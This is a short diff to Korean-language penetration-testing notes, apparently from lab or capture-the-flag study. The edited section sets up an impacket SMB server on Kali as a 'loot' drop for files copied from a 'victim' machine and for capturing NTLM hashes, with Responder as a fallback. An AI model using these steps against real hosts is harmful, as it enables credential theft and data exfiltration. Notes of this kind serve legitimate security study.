@@ -17,8 +17,12 @@ ip a show tun0
 ```bash
 # 칼리에서 리스너 서버 실행
 mkdir /tmp/loot
-impacket-smbserver share /tmp/loot -smb2support # NTLM 해시를 받을 경우 -h 옵션을 붙여 인증을 강제할 수 있다 
+impacket-smbserver share /tmp/loot -smb2support 
+sudo impacket-smbserver share /tmp/loot -smb2support -username a -password a
+# NTLM 해시를 받을 경우 -username, -password  옵션을 붙여 인증을 강제할 수 있다 
+# 추가로 해시가 안 찍힐 경우 -debug를 통해 보면 된다 (그래도 안될 경우 Responder 사용)
 ```
+
 
 ```bash
 :: 피해자에서 복사
